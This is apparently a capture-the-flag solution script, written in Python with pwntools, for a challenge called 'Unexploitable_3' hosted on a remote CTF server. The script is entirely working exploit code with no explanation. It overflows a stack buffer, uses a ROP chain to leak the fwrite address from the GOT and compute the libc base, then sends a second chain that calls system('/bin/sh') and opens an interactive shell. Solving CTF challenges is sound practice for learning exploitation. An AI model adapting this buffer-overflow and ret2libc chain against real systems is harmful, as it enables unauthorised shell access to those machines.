from pwn import * 
# s = process("./Unexploitable_3")
s = remote("ctf.j0n9hyun.xyz", 3034)
# context.log_level="DEBUG"
raw_input("attach now")
elf = ELF("./Unexploitable_3")
libc = ELF("./libc.so.6")
POP_RDI = 0x0000000000400743
POP_RSI = 0x0000000000400741
MOV_RCX_RDI = 0x0000000000400658
CALL_R12 = 0x0000000000400720
POP_6x = 0x000000000040073a
FWRITE_GOT = elf.got.fwrite
FGETS_GOT = elf.got.fgets
RET = 0x00000000004004d1

pl = "a"*0x18
pl += p64(POP_RDI)
pl += p64(0x601050)
pl += p64(MOV_RCX_RDI)

pl += p64(POP_6x)
pl += p64(0)
pl += p64(1)
pl += p64(FWRITE_GOT)
pl += p64(64)
pl += p64(1)
pl += p64(FWRITE_GOT)
pl += p64(CALL_R12)
pl += p64(RET)*7
pl += p64(elf.sym.main)
s.sendline(pl)

s.recvuntil("Impossible RTL ha? Nothing for you!\x0a")
leak = u64(s.recv(6).ljust(8,"\x00"))
libc.address = leak - libc.symbols['fwrite']


log.info("fwrite: {}".format(hex(leak)))
log.info("libc.address: {}".format(hex(libc.address)))

pl = "a"*0x18
pl += p64(POP_RDI)
pl += p64(next(libc.search("/bin/sh")))
pl += p64(libc.symbols['system'])
s.sendline(pl)
s.interactive()